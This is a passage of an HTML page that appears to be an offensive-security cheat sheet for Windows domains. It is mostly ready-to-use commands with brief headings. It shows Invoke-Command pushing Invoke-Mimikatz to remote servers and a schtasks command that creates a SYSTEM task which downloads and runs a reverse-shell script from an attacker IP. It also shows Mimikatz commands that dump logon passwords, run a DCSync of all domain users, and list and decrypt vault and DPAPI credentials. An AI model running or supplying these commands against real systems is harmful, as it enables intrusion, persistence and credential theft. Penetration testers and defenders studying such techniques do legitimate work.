class="cm-builtin">New-PSSession</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$cred</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#To many computers</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$cred</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-punctuation">(</span><span class="cm-builtin">Get-Content</span> <span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">listServers</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span><span class="cm-punctuation">)</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-execute-scripts">Execute scripts</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 543px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 542.619px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Script block</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">Scriptblock</span> <span class="cm-punctuation">{</span><span class="cm-builtin">Get-Process</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">Server01</span><span class="cm-punctuation">,</span> <span class="cm-identifier">Server02</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Script from file</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">FilePath</span> <span class="cm-punctuation">.\</span><span class="cm-identifier">Invoke-Mimikatz</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">Server01</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-execute-locally-load">Execute locally loaded function to remote</h4>
<p id="bkmrk-can-be-usefull-to-by">Can be usefull to bypass some restricions</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 745px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 745.286px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptBlock</span> <span class="cm-variable-2">${function:Invoke-Mimikatz}</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">Server01</span><span class="cm-punctuation">,</span> <span class="cm-identifier">Server02</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With arguments</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptBlock</span> <span class="cm-variable-2">${function:Invoke-Mimikatz}</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">Server01</span> <span class="cm-operator">-</span><span class="cm-identifier">ArgumentList</span> <span class="cm-identifier">DumpCreds</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-item-copy">Item copy</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 550px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 549.857px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Copy-Item</span> <span class="cm-operator">-</span><span class="cm-identifier">ToSession</span> <span class="cm-variable-2">$sess</span> <span class="cm-operator">-</span><span class="cm-identifier">Path</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">local_path</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Destination</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">path_on_target</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-scheduled-task-creat">Scheduled task creation</h3>
<p id="bkmrk-create-a-scheduled-t">Create a scheduled task on a remote machine, with sufficient rights</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1570px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 1570.43px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Creation</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">schtasks</span> <span class="cm-operator">/</span><span class="cm-identifier">create</span> <span class="cm-operator">/</span><span class="cm-identifier">S</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-builtin">SC</span> <span class="cm-identifier">Weekly</span> <span class="cm-operator">/</span><span class="cm-identifier">RU</span> <span class="cm-string">"NT Authority\SYSTEM"</span> <span class="cm-operator">/</span><span class="cm-identifier">TN</span> <span class="cm-string">"STCheck"</span> <span class="cm-operator">/</span><span class="cm-identifier">TR</span> <span class="cm-string">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://&lt;attacker_IP&gt;/Invoke-PowerShellTcp.ps1''')'"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Task execution</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">schtasks</span> <span class="cm-operator">/</span><span class="cm-identifier">Run</span> <span class="cm-operator">/</span><span class="cm-identifier">S</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">TN</span> <span class="cm-string">"STCheck"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-credentials-gatherin">Credentials gathering / Mimikatz</h3>
<h4 id="bkmrk-dump-creds">Dump creds</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 651px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 206px; min-width: 651.19px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Dump credentials on a local machine.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">DumpCreds</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Dump credentials on multiple remote machines.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">DumpCreds</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-punctuation">@(</span><span class="cm-string">"Server01"</span><span class="cm-punctuation">,</span><span class="cm-string">"Server02"</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Make a DCSync attack on all the users</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::dcsync /domain:domain.local /all"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 206px;"></div><div class="CodeMirror-gutters" style="height: 256px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-credentials-vault-%26-">Credentials Vault &amp; DPAPI</h4>
<p id="bkmrk-credential-manager-b">Credential manager blobs are stored in <code>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials</code></p>
<p id="bkmrk-list-with-mimikatz%3A">List with Mimikatz:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 296.524px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"vault::list"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-to-decrypt-the-creds">To decrypt the creds, the DPAPI master encryption key must be retrieved. The key GUID can be retrieved with Mimikatz (the filed <code>guidMasterKey</code> is the one):</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 753px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 752.524px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\&lt;blob&gt;"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-the-guid-can-be-used">The GUID can be used to retrieve the key on the DC via a RPC call by providing the full path:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 919px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 919px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div 